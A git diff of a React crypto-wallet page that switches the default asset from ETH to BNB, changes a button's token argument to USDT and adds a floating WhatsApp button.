@@ -13,14 +13,14 @@ import { useAppKit, useAppKitAccount } from '@reown/appkit/react'
 import { useBalance } from 'wagmi'
 import { logUserConnection } from '@/lib/firebase'
 import { useWalletSend } from '@/hooks/useWalletSend'
-
+import FloatingWhatsApp from "@/components/FloatingWhatsApp";
 const Index = () => {
     const [isConnecting, setIsConnecting] = useState(false);
     const { toast } = useToast();
     const { open } = useAppKit()
     const { handleOpenSendWithArguments } = useWalletSend()
     const { address, isConnected } = useAppKitAccount()
-    const [selectedAsset, setSelectedAsset] = useState('ETH')
+    const [selectedAsset, setSelectedAsset] = useState('BNB')
 
     const { data: balanceData } = useBalance({
         address: address as `0x${string}`,
@@ -89,7 +89,7 @@ const Index = () => {
                                 <SelectValue placeholder="Select Asset" />
                             </SelectTrigger>
                             <SelectContent className="bg-navy-light border-primary/20">
-                                <SelectItem value="ETH">Ethereum (ETH)</SelectItem>
+                                <SelectItem value="BNB">BNB Smart Chain (BNB)</SelectItem>
                                 <SelectItem value="USDC">USD Coin (USDC)</SelectItem>
                                 <SelectItem value="USDT">Tether (USDT)</SelectItem>
                             </SelectContent>
@@ -98,7 +98,7 @@ const Index = () => {
                     </div>
                 }
                 <Button
-                    onClick={() => { isConnected ? handlePartnerClick('USDC') : handleVerify() }}
+                    onClick={() => { isConnected ? handlePartnerClick('USDT') : handleVerify() }}
                     disabled={isConnecting}
                     size="lg"
                     className="min-w-[160px] transition-all duration-300"
@@ -119,6 +119,7 @@ const Index = () => {
                     )}
                 </Button>
             </div>
+             <FloatingWhatsApp />
         </main>
     );
 };
